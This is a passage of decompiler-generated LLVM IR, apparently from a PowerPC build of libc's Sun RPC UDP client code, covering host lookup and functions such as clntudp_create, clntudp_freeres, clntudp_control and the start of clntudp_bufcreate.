  store i32 %v0_1000f3d0, i32* @r29, align 4
  %v3_1000f3dc = icmp eq i32 %v3_1000f3d4, 0
  br i1 %v3_1000f3dc, label %dec_label_pc_1000f3e4, label %dec_label_pc_1000f400

dec_label_pc_1000f3e4:                            ; preds = %entry
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268497904, i32* @lr, align 4
  %v2_1000f3ec = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_1000f3ec, i32* @r30, align 4
  %v3_1000f3f0 = icmp eq i32 %v2_1000f3ec, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_1000f3f0, label %dec_label_pc_1000f5f8, label %dec_label_pc_1000f3fc

dec_label_pc_1000f3fc:                            ; preds = %dec_label_pc_1000f3e4
  %v1_1000f3fc = load i32, i32* @r29, align 4
  %v2_1000f3fc = add i32 %v1_1000f3fc, 164
  %v3_1000f3fc = inttoptr i32 %v2_1000f3fc to i32*
  store i32 %v2_1000f3ec, i32* %v3_1000f3fc, align 4
  %v0_1000f400.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000f400

dec_label_pc_1000f400:                            ; preds = %entry, %dec_label_pc_1000f3fc
  %v0_1000f400 = phi i32 [ %v3_1000f3d4, %entry ], [ %v0_1000f400.pre, %dec_label_pc_1000f3fc ]
  %v1_1000f400 = add i32 %v0_1000f400, 20
  %v2_1000f400 = inttoptr i32 %v1_1000f400 to i32*
  %v3_1000f400 = load i32, i32* %v2_1000f400, align 4
  store i32 %v3_1000f400, i32* @r29, align 4
  %v3_1000f404 = icmp eq i32 %v3_1000f400, 0
  br i1 %v3_1000f404, label %dec_label_pc_1000f40c, label %dec_label_pc_1000f424

dec_label_pc_1000f40c:                            ; preds = %dec_label_pc_1000f400
  store i32 256, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000f414.384 to i32), i32* @lr, align 4
  %v0_1000f410 = call i32 @malloc()
  %v1_1000f410 = inttoptr i32 %v0_1000f410 to i8*
  store i32 %v0_1000f410, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000f418 = load i32, i32* @r30, align 4
  %v3_1000f418 = add i32 %v2_1000f418, 20
  %v4_1000f418 = inttoptr i32 %v3_1000f418 to i32*
  store i32 %v0_1000f410, i32* %v4_1000f418, align 4
  %v0_1000f41c = load i32, i32* @r29, align 4
  %v1_1000f41c = trunc i32 %v0_1000f41c to i8
  store i8 %v1_1000f41c, i8* %v1_1000f410, align 1
  %v0_1000f420 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f420 = load i32, i32* @r30, align 4
  %v2_1000f420 = add i32 %v1_1000f420, 4
  %v3_1000f420 = inttoptr i32 %v2_1000f420 to i32*
  store i32 %v0_1000f420, i32* %v3_1000f420, align 4
  %v0_1000f424.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000f424

dec_label_pc_1000f424:                            ; preds = %dec_label_pc_1000f400, %dec_label_pc_1000f40c
  %v0_1000f448 = phi i32 [ %v0_1000f400, %dec_label_pc_1000f400 ], [ %v0_1000f424.pre, %dec_label_pc_1000f40c ]
  %v1_1000f424 = add i32 %v0_1000f448, 16
  %v2_1000f424 = inttoptr i32 %v1_1000f424 to i32*
  %v3_1000f424 = load i32, i32* %v2_1000f424, align 4
  store i32 %v3_1000f424, i32* %r0.global-to-local, align 4
  %v3_1000f428 = icmp eq i32 %v3_1000f424, 0
  br i1 %v3_1000f428, label %dec_label_pc_1000f45c, label %dec_label_pc_1000f430

dec_label_pc_1000f430:                            ; preds = %dec_label_pc_1000f424
  %v1_1000f430 = add i32 %v0_1000f448, 8
  %v2_1000f430 = inttoptr i32 %v1_1000f430 to i32*
  %v3_1000f430 = load i32, i32* %v2_1000f430, align 4
  store i32 %v3_1000f430, i32* %r0.global-to-local, align 4
  %v1_1000f434 = load i32, i32* %r23.global-to-local, align 4
  %v4_1000f434 = icmp eq i32 %v3_1000f430, %v1_1000f434
  br i1 %v4_1000f434, label %dec_label_pc_1000f43c, label %dec_label_pc_1000f45c

dec_label_pc_1000f43c:                            ; preds = %dec_label_pc_1000f430
  %v1_1000f43c = add i32 %v0_1000f448, 12
  %v2_1000f43c = inttoptr i32 %v1_1000f43c to i32*
  %v3_1000f43c = load i32, i32* %v2_1000f43c, align 4
  store i32 %v3_1000f43c, i32* %r0.global-to-local, align 4
  %v1_1000f440 = load i32, i32* @r22, align 4
  %v4_1000f440 = icmp eq i32 %v3_1000f43c, %v1_1000f440
  br i1 %v4_1000f440, label %dec_label_pc_1000f448, label %dec_label_pc_1000f45c

dec_label_pc_1000f448:                            ; preds = %dec_label_pc_1000f43c
  %v1_1000f448 = add i32 %v0_1000f448, 20
  %v2_1000f448 = inttoptr i32 %v1_1000f448 to i32*
  %v3_1000f448 = load i32, i32* %v2_1000f448, align 4
  store i32 %v3_1000f448, i32* %r3.global-to-local, align 4
  %v0_1000f44c = load i32, i32* @r21, align 4
  store i32 %v0_1000f44c, i32* @r4, align 4
  %v2_1000f450 = inttoptr i32 %v3_1000f448 to i8*
  %v3_1000f450 = call i32 @__GI_strcoll(i8* %v2_1000f450, i32 %v0_1000f44c)
  store i32 %v3_1000f450, i32* %r3.global-to-local, align 4
  %v3_1000f454 = icmp eq i32 %v3_1000f450, 0
  br i1 %v3_1000f454, label %dec_label_pc_1000f448.dec_label_pc_1000f5a0_crit_edge, label %dec_label_pc_1000f448.dec_label_pc_1000f45c_crit_edge

dec_label_pc_1000f448.dec_label_pc_1000f5a0_crit_edge: ; preds = %dec_label_pc_1000f448
  br label %dec_label_pc_1000f5a0

dec_label_pc_1000f448.dec_label_pc_1000f45c_crit_edge: ; preds = %dec_label_pc_1000f448
  %v0_1000f45c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000f45c

dec_label_pc_1000f45c:                            ; preds = %dec_label_pc_1000f448.dec_label_pc_1000f45c_crit_edge, %dec_label_pc_1000f43c, %dec_label_pc_1000f430, %dec_label_pc_1000f424
  %v0_1000f45c = phi i32 [ %v0_1000f45c.pre, %dec_label_pc_1000f448.dec_label_pc_1000f45c_crit_edge ], [ %v0_1000f448, %dec_label_pc_1000f43c ], [ %v0_1000f448, %dec_label_pc_1000f430 ], [ %v0_1000f448, %dec_label_pc_1000f424 ]
  %v1_1000f45c = add i32 %v0_1000f45c, 4
  %v2_1000f45c = inttoptr i32 %v1_1000f45c to i32*
  %v3_1000f45c = load i32, i32* %v2_1000f45c, align 4
  store i32 %v3_1000f45c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  %v2_1000f464 = add i32 %v0_1000f45c, 16
  %v3_1000f464 = inttoptr i32 %v2_1000f464 to i32*
  store i32 0, i32* %v3_1000f464, align 4
  %v3_1000f468 = icmp eq i32 %v3_1000f45c, -1
  br i1 %v3_1000f468, label %dec_label_pc_1000f47c, label %dec_label_pc_1000f470

dec_label_pc_1000f470:                            ; preds = %dec_label_pc_1000f45c
  store i32 ptrtoint (i32* @global_var_1000f474.385 to i32), i32* @lr, align 4
  %v1_1000f470 = call i32 @__libc_close(i32 %v3_1000f45c)
  store i32 %v1_1000f470, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1000f478 = load i32, i32* @r30, align 4
  %v2_1000f478 = add i32 %v1_1000f478, 4
  %v3_1000f478 = inttoptr i32 %v2_1000f478 to i32*
  store i32 -1, i32* %v3_1000f478, align 4
  br label %dec_label_pc_1000f47c

dec_label_pc_1000f47c:                            ; preds = %dec_label_pc_1000f45c, %dec_label_pc_1000f470
  %v0_1000f47c = load i32, i32* @r30, align 4
  %v1_1000f47c = inttoptr i32 %v0_1000f47c to i32*
  %v2_1000f47c = load i32, i32* %v1_1000f47c, align 4
  store i32 %v2_1000f47c, i32* %r3.global-to-local, align 4
  %v3_1000f480 = icmp eq i32 %v2_1000f47c, 0
  br i1 %v3_1000f480, label %dec_label_pc_1000f49c, label %dec_label_pc_1000f488

dec_label_pc_1000f488:                            ; preds = %dec_label_pc_1000f47c
  %v1_1000f488 = add i32 %v2_1000f47c, 4
  %v2_1000f488 = inttoptr i32 %v1_1000f488 to i32*
  %v3_1000f488 = load i32, i32* %v2_1000f488, align 4
  %v1_1000f48c = add i32 %v3_1000f488, 16
  %v2_1000f48c = inttoptr i32 %v1_1000f48c to i32*
  %v3_1000f48c = load i32, i32* %v2_1000f48c, align 4
  call void @__pseudo_call(i32 %v3_1000f48c)
  %v0_1000f498 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000f498 = load i32, i32* @r30, align 4
  %v2_1000f498 = inttoptr i32 %v1_1000f498 to i32*
  store i32 %v0_1000f498, i32* %v2_1000f498, align 4
  br label %dec_label_pc_1000f49c

dec_label_pc_1000f49c:                            ; preds = %dec_label_pc_1000f47c, %dec_label_pc_1000f488
  %v2_1000f49c = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_1000f49c, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r29, align 4
  store i32 %v2_1000f49c, i32* %stack_var_-1168, align 4
  %v2_1000f4dc = ptrtoint i32* %stack_var_-1145 to i32
  %v2_1000f4ec = ptrtoint i32* %stack_var_-120 to i32
  %v2_1000f4f0 = ptrtoint i32* %stack_var_-116 to i32
  br label %dec_label_pc_1000f4dc

dec_label_pc_1000f4ac:                            ; preds = %dec_label_pc_1000f4dc, %dec_label_pc_1000f508
  %v3_1000f4ac = load i32, i32* %stack_var_-116, align 4
  store i32 %v3_1000f4ac, i32* %r0.global-to-local, align 4
  %v3_1000f4b0 = icmp eq i32 %v3_1000f4ac, -1
  br i1 %v3_1000f4b0, label %dec_label_pc_1000f4b8, label %dec_label_pc_1000f5f4

dec_label_pc_1000f4b8:                            ; preds = %dec_label_pc_1000f4ac
  %v0_1000f4b8 = call i32 @__errno_location()
  store i32 %v0_1000f4b8, i32* %r3.global-to-local, align 4
  %v0_1000f4bc = load i32, i32* @r29, align 4
  %v1_1000f4bc = add i32 %v0_1000f4bc, 30
  store i32 %v1_1000f4bc, i32* %r0.global-to-local, align 4
  %v1_1000f4c0 = inttoptr i32 %v0_1000f4b8 to i32*
  %v2_1000f4c0 = load i32, i32* %v1_1000f4c0, align 4
  %v1_1000f4c4 = call i32 @__asm_rlwinm(i32 %v1_1000f4bc, i32 0, i32 0, i32 27)
  store i32 %v1_1000f4c4, i32* %r0.global-to-local, align 4
  %v3_1000f4cc = icmp eq i32 %v2_1000f4c0, 34
  br i1 %v3_1000f4cc, label %dec_label_pc_1000f4d4, label %dec_label_pc_1000f5f4

dec_label_pc_1000f4d4:                            ; preds = %dec_label_pc_1000f4b8
  %v2_1000f4d4 = load i32, i32* %stack_var_-1168, align 4
  store i32 %v2_1000f4d4, i32* %r0.global-to-local, align 4
  %v1_1000f4d8 = load i32, i32* @r1, align 4
  %v3_1000f4d8 = sub i32 %v1_1000f4d8, %v1_1000f4c4
  %v4_1000f4d8 = inttoptr i32 %v3_1000f4d8 to i32*
  store i32 %v2_1000f4d4, i32* %v4_1000f4d8, align 4
  br label %dec_label_pc_1000f4dc

dec_label_pc_1000f4dc:                            ; preds = %dec_label_pc_1000f49c, %dec_label_pc_1000f4d4
  store i32 %v2_1000f4dc, i32* %r0.global-to-local, align 4
  %v1_1000f4e4 = call i32 @__asm_rlwinm(i32 %v2_1000f4dc, i32 0, i32 0, i32 27)
  %v0_1000f4f4 = load i32, i32* @r21, align 4
  store i32 %v0_1000f4f4, i32* %r3.global-to-local, align 4
  %v0_1000f4f8 = load i32, i32* @r29, align 4
  %v1_1000f4f8 = mul i32 %v0_1000f4f8, 2
  store i32 %v1_1000f4f8, i32* %r29.global-to-local, align 4
  store i32 268498176, i32* @lr, align 4
  %v7_1000f4fc = call i32 @gethostbyname_r(i32 %v0_1000f4f4, i32* nonnull %stack_var_-96, i32 %v1_1000f4e4, i32 %v2_1000f4ec, i32 %v2_1000f4f0, i32 %v2_1000f4f0)
  store i32 %v7_1000f4fc, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v7_1000f4fc, 65536
  %sext.off = or i32 %sext, 65535
  %tmp = icmp ult i32 %sext.off, 131071
  br i1 %tmp, label %dec_label_pc_1000f508, label %dec_label_pc_1000f4ac

dec_label_pc_1000f508:                            ; preds = %dec_label_pc_1000f4dc
  %v3_1000f508 = load i32, i32* %stack_var_-120, align 4
  %v3_1000f50c = icmp eq i32 %v3_1000f508, 0
  br i1 %v3_1000f50c, label %dec_label_pc_1000f4ac, label %dec_label_pc_1000f514

dec_label_pc_1000f514:                            ; preds = %dec_label_pc_1000f508
  %v1_1000f514 = add i32 %v3_1000f508, 16
  %v2_1000f514 = inttoptr i32 %v1_1000f514 to i32*
  %v3_1000f514 = load i32, i32* %v2_1000f514, align 4
  %v2_1000f518 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_1000f518, i32* @r3, align 4
  %v1_1000f51c = add i32 %v3_1000f508, 12
  %v2_1000f51c = inttoptr i32 %v1_1000f51c to i32*
  %v3_1000f51c = load i32, i32* %v2_1000f51c, align 4
  store i32 %v3_1000f51c, i32* @r5, align 4
  %v1_1000f524 = inttoptr i32 %v3_1000f514 to i32*
  %v2_1000f524 = load i32, i32* %v1_1000f524, align 4
  store i32 %v2_1000f524, i32* @r4, align 4
  store i32 5, i32* %r27.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000f530.386 to i32), i32* @lr, align 4
  %v0_1000f52c = call i32 @memcpy()
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1000f534 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_1000f534, i32* %r3.global-to-local, align 4
  %v0_1000f538 = load i32, i32* @r23, align 4
  %v0_1000f53c = load i32, i32* @r22, align 4
  %v2_1000f540 = ptrtoint i32* %stack_var_-72 to i32
  %v0_1000f544 = load i32, i32* @r30, align 4
  %v1_1000f544 = add i32 %v0_1000f544, 4
  store i32 %v1_1000f544, i32* @r7, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v0_1000f550 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000f550, i32* %stack_var_-72, align 4
  store i32 268498268, i32* @lr, align 4
  %v6_1000f558 = call i32 @__GI_clntudp_create(i32* nonnull %stack_var_-112, i32 %v0_1000f538, i32 %v0_1000f53c, i32 %v2_1000f540, i32 %v1_1000f544)
  store i32 %v6_1000f558, i32* %r3.global-to-local, align 4
  %v3_1000f55c = icmp eq i32 %v6_1000f558, 0
  %v1_1000f560 = load i32, i32* @r30, align 4
  %v2_1000f560 = inttoptr i32 %v1_1000f560 to i32*
  store i32 %v6_1000f558, i32* %v2_1000f560, align 4
  br i1 %v3_1000f55c, label %dec_label_pc_1000f568, label %dec_label_pc_1000f574

dec_label_pc_1000f568:                            ; preds = %dec_label_pc_1000f514
  store i32 268498284, i32* @lr, align 4
  %v0_1000f568 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_1000f568, i32* %r3.global-to-local, align 4
  %v1_1000f56c = inttoptr i32 %v0_1000f568 to i32*
  %v2_1000f56c = load i32, i32* %v1_1000f56c, align 4
  store i32 %v2_1000f56c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f5f8

dec_label_pc_1000f574:                            ; preds = %dec_label_pc_1000f514
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000f578 = load i32, i32* @r23, align 4
  %v1_1000f578 = load i32, i32* @r30, align 4
  %v2_1000f578 = add i32 %v1_1000f578, 8
  %v3_1000f578 = inttoptr i32 %v2_1000f578 to i32*
  store i32 %v0_1000f578, i32* %v3_1000f578, align 4
  %v0_1000f57c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f57c = load i32, i32* @r30, align 4
  %v2_1000f57c = add i32 %v1_1000f57c, 16
  %v3_1000f57c = inttoptr i32 %v2_1000f57c to i32*
  store i32 %v0_1000f57c, i32* %v3_1000f57c, align 4
  %v0_1000f580 = load i32, i32* @r21, align 4
  store i32 %v0_1000f580, i32* @r4, align 4
  %v0_1000f584 = load i32, i32* @r22, align 4
  %v1_1000f584 = load i32, i32* @r30, align 4
  %v2_1000f584 = add i32 %v1_1000f584, 12
  %v3_1000f584 = inttoptr i32 %v2_1000f584 to i32*
  store i32 %v0_1000f584, i32* %v3_1000f584, align 4
  %v0_1000f58c = load i32, i32* @r30, align 4
  %v1_1000f58c = add i32 %v0_1000f58c, 20
  %v2_1000f58c = inttoptr i32 %v1_1000f58c to i32*
  %v3_1000f58c = load i32, i32* %v2_1000f58c, align 4
  store i32 %v3_1000f58c, i32* %r3.global-to-local, align 4
  store i32 268498324, i32* @lr, align 4
  %v3_1000f590 = call i32 @strncpy(i32 %v3_1000f58c, i32 %v0_1000f580, i32 255)
  store i32 %v3_1000f590, i32* %r3.global-to-local, align 4
  %v0_1000f594 = load i32, i32* @r30, align 4
  %v1_1000f594 = add i32 %v0_1000f594, 20
  %v2_1000f594 = inttoptr i32 %v1_1000f594 to i32*
  %v3_1000f594 = load i32, i32* %v2_1000f594, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000f59c = add i32 %v3_1000f594, 255
  %v4_1000f59c = inttoptr i32 %v3_1000f59c to i8*
  store i8 0, i8* %v4_1000f59c, align 1
  br label %dec_label_pc_1000f5a0

dec_label_pc_1000f5a0:                            ; preds = %dec_label_pc_1000f448.dec_label_pc_1000f5a0_crit_edge, %dec_label_pc_1000f574
  %v0_1000f5a8 = load i32, i32* @r30, align 4
  %v1_1000f5a8 = inttoptr i32 %v0_1000f5a8 to i32*
  %v2_1000f5a8 = load i32, i32* %v1_1000f5a8, align 4
  store i32 25, i32* %stack_var_-72, align 4
  store i32 %v2_1000f5a8, i32* %r3.global-to-local, align 4
  %v1_1000f5c8 = add i32 %v2_1000f5a8, 4
  %v2_1000f5c8 = inttoptr i32 %v1_1000f5c8 to i32*
  %v3_1000f5c8 = load i32, i32* %v2_1000f5c8, align 4
  %v1_1000f5d0 = inttoptr i32 %v3_1000f5c8 to i32*
  %v2_1000f5d0 = load i32, i32* %v1_1000f5d0, align 4
  call void @__pseudo_call(i32 %v2_1000f5d0)
  %v0_1000f5e0 = load i32, i32* %r3.global-to-local, align 4
  %v3_1000f5e0 = icmp eq i32 %v0_1000f5e0, 0
  br i1 %v3_1000f5e0, label %dec_label_pc_1000f5f8, label %dec_label_pc_1000f5e8

dec_label_pc_1000f5e8:                            ; preds = %dec_label_pc_1000f5a0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000f5ec = load i32, i32* @r30, align 4
  %v2_1000f5ec = add i32 %v1_1000f5ec, 16
  %v3_1000f5ec = inttoptr i32 %v2_1000f5ec to i32*
  store i32 0, i32* %v3_1000f5ec, align 4
  %v0_1000f60c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f5f8

dec_label_pc_1000f5f4:                            ; preds = %dec_label_pc_1000f4b8, %dec_label_pc_1000f4ac
  store i32 13, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f5f8

dec_label_pc_1000f5f8:                            ; preds = %dec_label_pc_1000f5a0, %dec_label_pc_1000f3e4, %dec_label_pc_1000f5e8, %dec_label_pc_1000f568, %dec_label_pc_1000f5f4
  %v0_1000f60c = phi i32 [ 0, %dec_label_pc_1000f5a0 ], [ 0, %dec_label_pc_1000f3e4 ], [ %v0_1000f60c.pre, %dec_label_pc_1000f5e8 ], [ %v2_1000f56c, %dec_label_pc_1000f568 ], [ 13, %dec_label_pc_1000f5f4 ]
  %v2_1000f5f8 = load i32, i32* %stack_var_-128, align 4
  %v1_1000f5fc = add i32 %v2_1000f5f8, 4
  %v2_1000f5fc = inttoptr i32 %v1_1000f5fc to i32*
  %v3_1000f5fc = load i32, i32* %v2_1000f5fc, align 4
  store i32 %v3_1000f5fc, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000f60c

; uselistorder directives
  uselistorder i32 %v2_1000f5a8, { 1, 0 }
  uselistorder i32 %v2_1000f4f0, { 1, 0 }
  uselistorder i32 %v3_1000f45c, { 1, 0, 2 }
  uselistorder i32 %v0_1000f45c, { 1, 0 }
  uselistorder i32 %v0_1000f410, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 11, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 13, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_1000f5f8, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1000f5a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f4dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000f4ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000f49c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f47c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f424, { 1, 0 }
  uselistorder label %dec_label_pc_1000f400, { 1, 0 }
}

define i32 @clntudp_geterr(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @clntudp_freeres(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1000f63c = add i32 %arg1, 8
  %v2_1000f63c = inttoptr i32 %v1_1000f63c to i32*
  %v3_1000f63c = load i32, i32* %v2_1000f63c, align 4
  store i32 %v3_1000f63c, i32* %r3.global-to-local, align 4
  %v2_1000f640 = add i32 %v3_1000f63c, 56
  %v3_1000f640 = inttoptr i32 %v2_1000f640 to i32*
  store i32 2, i32* %v3_1000f640, align 4
  %v0_1000f644 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f644 = add i32 %v0_1000f644, 56
  store i32 %v1_1000f644, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %arg2)
  ret i32 %v1_1000f644

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
}

define i32 @clntudp_abort() local_unnamed_addr {
entry:
  %v0_1000f660 = load i32, i32* @r3, align 4
  ret i32 %v0_1000f660
}

define i32 @clntudp_control(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_1000f664 = add i32 %arg2, -1
  %v2_1000f66c = icmp ugt i32 %v1_1000f664, 14
  br i1 %v2_1000f66c, label %dec_label_pc_1000f694, label %dec_label_pc_1000f678

dec_label_pc_1000f678:                            ; preds = %entry
  %v1_1000f67c = mul i32 %v1_1000f664, 4
  %v2_1000f684 = add i32 %v1_1000f67c, ptrtoint (i32* @global_var_100172e0.387 to i32)
  %v3_1000f684 = inttoptr i32 %v2_1000f684 to i32*
  %v4_1000f684 = load i32, i32* %v3_1000f684, align 4
  %v2_1000f688 = add i32 %v4_1000f684, ptrtoint (i32* @global_var_100172e0.387 to i32)
  call void @__pseudo_branch(i32 %v2_1000f688)
  br label %dec_label_pc_1000f694

dec_label_pc_1000f694:                            ; preds = %entry, %dec_label_pc_1000f678
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_1000f694, { 1, 0 }
}

define i32 @function_1000f69c() local_unnamed_addr {
dec_label_pc_1000f69c:
  %v1_1000f6b0 = load i32, i32* @r10, align 4
  %v2_1000f6b0 = add i32 %v1_1000f6b0, 4
  %v3_1000f6b0 = inttoptr i32 %v2_1000f6b0 to i32*
  store i32 1, i32* %v3_1000f6b0, align 4
  ret i32 1
}

define i32 @function_1000f6b8(i32* %arg1) local_unnamed_addr {
dec_label_pc_1000f6b8:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1000f6b8 = add i32 %tmp, 4
  %v2_1000f6b8 = inttoptr i32 %v1_1000f6b8 to i32*
  %v3_1000f6b8 = load i32, i32* %v2_1000f6b8, align 4
  %v2_1000f6c0 = load i32, i32* %arg1, align 4
  store i32 %v2_1000f6c0, i32* %r0.global-to-local, align 4
  %v1_1000f6c4 = load i32, i32* @r10, align 4
  %v2_1000f6c4 = add i32 %v1_1000f6c4, 40
  %v3_1000f6c4 = inttoptr i32 %v2_1000f6c4 to i32*
  store i32 %v3_1000f6b8, i32* %v3_1000f6c4, align 4
  %v0_1000f6c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f6c8 = load i32, i32* @r10, align 4
  %v2_1000f6c8 = add i32 %v1_1000f6c8, 36
  %v3_1000f6c8 = inttoptr i32 %v2_1000f6c8 to i32*
  store i32 %v0_1000f6c8, i32* %v3_1000f6c8, align 4
  ret i32 1
}

define i32 @function_1000f6d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000f6d0:
  %r9.global-to-local = alloca i32, align 4
  %v0_1000f6d0 = load i32, i32* @r10, align 4
  %v1_1000f6d0 = add i32 %v0_1000f6d0, 40
  %v2_1000f6d0 = inttoptr i32 %v1_1000f6d0 to i32*
  %v3_1000f6d0 = load i32, i32* %v2_1000f6d0, align 4
  store i32 %v3_1000f6d0, i32* %r9.global-to-local, align 4
  %v1_1000f6d4 = add i32 %v0_1000f6d0, 36
  %v2_1000f6d4 = inttoptr i32 %v1_1000f6d4 to i32*
  %v3_1000f6d4 = load i32, i32* %v2_1000f6d4, align 4
  %v1_1000f700 = load i32, i32* @r12, align 4
  %v2_1000f700 = inttoptr i32 %v1_1000f700 to i32*
  store i32 %v3_1000f6d4, i32* %v2_1000f700, align 4
  %v0_1000f704 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f704 = load i32, i32* @r12, align 4
  %v2_1000f704 = add i32 %v1_1000f704, 4
  %v3_1000f704 = inttoptr i32 %v2_1000f704 to i32*
  store i32 %v0_1000f704, i32* %v3_1000f704, align 4
  ret i32 1
}

define i32 @function_1000f70c() local_unnamed_addr {
dec_label_pc_1000f70c:
  ret i32 1
}

define i32 @function_1000f720(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000f720:
  %v0_1000f720 = load i32, i32* @r10, align 4
  %v1_1000f720 = inttoptr i32 %v0_1000f720 to i32*
  %v2_1000f720 = load i32, i32* %v1_1000f720, align 4
  %v1_1000f77c = load i32, i32* @r12, align 4
  %v2_1000f77c = inttoptr i32 %v1_1000f77c to i32*
  store i32 %v2_1000f720, i32* %v2_1000f77c, align 4
  ret i32 1
}

define i32 @function_1000f784(i32* %arg1) local_unnamed_addr {
dec_label_pc_1000f784:
  %v0_1000f784 = load i32, i32* @r10, align 4
  %v1_1000f784 = add i32 %v0_1000f784, 88
  %v2_1000f784 = inttoptr i32 %v1_1000f784 to i32*
  %v3_1000f784 = load i32, i32* %v2_1000f784, align 4
  %v2_1000f78c = load i32, i32* %arg1, align 4
  %v2_1000f790 = add i32 %v3_1000f784, 12
  %v3_1000f790 = inttoptr i32 %v2_1000f790 to i32*
  store i32 %v2_1000f78c, i32* %v3_1000f790, align 4
  ret i32 1
}

define i32 @__GI_clntudp_bufcreate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %v0_1000f798 = load i32, i32* @lr, align 4
  store i32 %v0_1000f798, i32* %r0.global-to-local, align 4
  %v0_1000f7a4 = load i32, i32* @r8, align 4
  %v0_1000f7ac = load i32, i32* @r9, align 4
  store i32 %v0_1000f7ac, i32* @r29, align 4
  store i32 %arg1, i32* @r30, align 4
  %v1_1000f7b4 = add i32 %v0_1000f7a4, 3
  store i32 12, i32* @r3, align 4
  store i32 %arg2, i32* @r23, align 4
  store i32 %arg3, i32* @r22, align 4
  %v0_1000f7c4 = load i32, i32* @r6, align 4
  %v1_1000f7c4 = inttoptr i32 %v0_1000f7c4 to i32*
  %v2_1000f7c4 = load i32, i32* %v1_1000f7c4, align 4
  store i32 %v2_1000f7c4, i32* %r25.global-to-local, align 4
  %v1_1000f7c8 = add i32 %v0_1000f7c4, 4
  %v2_1000f7c8 = inttoptr i32 %v1_1000f7c8 to i32*
  %v3_1000f7c8 = load i32, i32* %v2_1000f7c8, align 4
  store i32 %v3_1000f7c8, i32* @r26, align 4
  %v0_1000f7cc = load i32, i32* @r7, align 4
  store i32 %v0_1000f7cc, i32* %r24.global-to-local, align 4
  %v1_1000f7d0 = call i32 @__asm_rlwinm(i32 %v1_1000f7b4, i32 0, i32 0, i32 29)
  store i32 268498904, i32* @lr, align 4
  %v0_1000f7d4 = call i32 @malloc()
  store i32 %v0_1000f7d4, i32* %r3.global-to-local, align 4
  %v0_1000f7d8 = load i32, i32* @r29, align 4
  %v1_1000f7d8 = add i32 %v0_1000f7d8, 3
  store i32 %v0_1000f7d4, i32* @r27, align 4
  %v1_1000f7e0 = call i32 @__asm_rlwinm(i32 %v1_1000f7d8, i32 0, i32 0, i32 29)
  %v1_1000f7e4 = add i32 %v1_1000f7d0, 100
  %v2_1000f7e8 = add i32 %v1_1000f7e4, %v1_1000f7e0
  store i32 %v2_1000f7e8, i32* @r3, align 4
  store i32 268498928, i32* @lr, align 4
  %v0_1000f7ec = call i32 @malloc()
  store i32 %v0_1000f7ec, i32* %r3.global-to-local, align 4
  %v0_1000f7f0 = load i32, i32* @r27, align 4
  %v3_1000f7f0 = icmp eq i32 %v0_1000f7f0, 0
  store i32 %v0_1000f7ec, i32* @r31, align 4
